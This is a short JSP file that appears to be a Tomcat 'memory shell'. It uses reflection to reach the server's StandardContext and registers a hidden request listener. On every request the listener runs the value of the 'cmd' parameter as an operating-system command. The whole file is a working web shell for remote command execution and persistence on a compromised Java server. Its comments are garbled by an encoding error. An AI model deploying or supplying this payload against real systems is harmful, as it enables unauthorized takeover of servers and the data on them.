<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%
    Object obj = request.getServletContext();
    java.lang.reflect.Field field = obj.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
    //��ȡApplicationContext
    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);
    //��ȡStandardContext
    ListenerDemo listenerdemo = new ListenerDemo();
    //�����ܹ�ִ�������Listener
    standardContext.addApplicationEventListener(listenerdemo);
%>
<%!
    public class ListenerDemo implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            System.out.println("requestDestroyed");
        }
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("requestInitialized");
            try{
                String cmd = sre.getServletRequest().getParameter("cmd");
                Runtime.getRuntime().exec(cmd).getInputStream();

            }catch (Exception e ){
                //e.printStackTrace();
            }
        }
    }
%>